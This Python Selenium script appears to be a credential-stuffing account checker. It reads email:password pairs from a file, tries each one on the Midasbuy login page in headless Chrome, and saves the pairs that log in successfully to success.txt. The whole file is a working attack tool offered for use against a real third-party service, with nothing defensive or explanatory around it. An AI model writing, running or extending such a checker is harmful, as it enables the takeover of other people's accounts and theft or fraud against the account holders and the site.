import time
import json
import sys
import os
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def setup_driver():
    chrome_options = Options()

    # 🔥 stable headless mode
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")

    # ❌ مهم: متحطش binary_location عشان Selenium يكتشفه تلقائي

    driver = webdriver.Chrome(options=chrome_options)
    return driver


def save_success(email, password):
    with open("success.txt", "a") as f:
        f.write(f"{email}:{password}\n")


def login(email, password):
    driver = setup_driver()

    try:
        print(f"\n[*] Checking: {email}")

        driver.get("https://www.midasbuy.com/midasbuy/eg/login#login")

        wait = WebDriverWait(driver, 20)

        # inputs
        email_input = wait.until(
            EC.presence_of_element_located((By.ID, "loginUsername"))
        )
        password_input = driver.find_element(By.ID, "loginPassword")
        login_button = driver.find_element(By.ID, "loginButton")

        email_input.clear()
        password_input.clear()

        email_input.send_keys(email)
        password_input.send_keys(password)

        login_button.click()

        time.sleep(5)

        # 🟢 check success from URL or page state
        current_url = driver.current_url

        if "login" not in current_url:
            print(f"✅ SUCCESS: {email}")
            save_success(email, password)
            return True
        else:
            print(f"❌ FAILED: {email}")
            return False

    except Exception as e:
        print(f"[!] Error: {email} -> {e}")
        return False

    finally:
        driver.quit()


if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: python midas_login.py accounts.txt")
        sys.exit(1)

    file_path = sys.argv[1]

    with open(file_path, "r") as f:
        lines = f.readlines()

    print(f"[*] Loaded {len(lines)} accounts")

    for line in lines:
        line = line.strip()

        if ":" not in line:
            continue

        email, password = line.split(":", 1)

        login(email, password)

        print("-" * 40)
